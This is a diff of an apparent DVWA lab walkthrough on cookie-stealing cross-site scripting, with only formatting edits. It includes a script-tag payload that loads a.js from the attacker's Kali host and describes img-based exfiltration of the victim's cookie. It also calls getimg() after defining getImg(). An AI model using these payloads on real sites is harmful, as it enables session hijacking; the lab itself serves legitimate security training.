@@ -32,7 +32,7 @@ Plop it in the URL, like so:
 
 <img src="https://github.com/mrudy/dvwa-guide-2019/blob/master/low/screenshots/xssdalert.png" width="500">
 
-<i>Note that I actually input <b>document.cookie.split(";")[0]</b> as my payload, in order to hide my session ID. Just a privacy thing for me. You don't have to do that, and it impacts nothing besides what you see in my screenshots.</i>
+<i>Note that I actually input <code>document.cookie.split(";")[0]</code> as my payload, in order to hide my session ID. Just a privacy thing for me. You don't have to do that, and it impacts nothing besides what you see in my screenshots.</i>
 
 Nice, we see the cookie details! However, we experience a bit of a problem. This <code>alert</code> script only displays the cookie details to the current logged in user. That doesn't do us much good - how likely is it that during a pentest, we'll have visual access to every victim's screen? Let's try to find a way to get the cookie on Kali, no matter where the victims are.
 
@@ -50,7 +50,7 @@ I personally like to build a malicious URL that points to an existing Javascript
 
 <h4><b>Building The Exploit</b></h4>
 
-We won't need to spend much time on this one. All we need to do is specify a source file (which we'll call <code>a.js</code>) in the XSS exploit. And to stay stealthy, we won't cause a visible <code>alert</code> anymore. Here's what we get:
+We won't need to spend much time on this one. All we need to do is specify a source file (which we'll call "a.js") in the XSS exploit. And to stay stealthy, we won't cause a visible <code>alert</code> anymore. Here's what we get:
 
 <code>&#60;script src="http://[your_Kali_IP]:9999/a.js"&#62;&#60;/script&#62;</code>
 
@@ -72,9 +72,9 @@ As I said above, we need to find a way to take the stolen cookie, build a URL wi
 <br><br>
 <code>getimg();</code>
 
-First, we define the function <code>getImg()</code>. The first line of the function defines a new <code>img</code> web page element and stores that in the variable <code><b>img</b></code>. We specify the source of this new element as a fake web page (with a name of [whatever the user's cookie is]) and states that the page is hosted on our temporary web server. It then puts the final <code>img</code> element at the bottom of the web page. Finally, we execute the function.
+First, we define the function <code>getImg()</code>. The first line of the function defines a new <code>img</code> web page element and stores that in the variable <code><b>img</b></code>. We specify the source of this new element as a fake web page with a name set to whatever the user's cookie is set to. It then states that the page is hosted on our temporary web server. It then puts the final <code>img</code> element at the bottom of the web page. Finally, we execute the function.
 
-Let's save this file as <code>a.js</code> and place it in our web server root.
+Let's save this file as "a.js" and place it in our web server root.
 
 <h4><b>Running the Payload</b></h4>
 
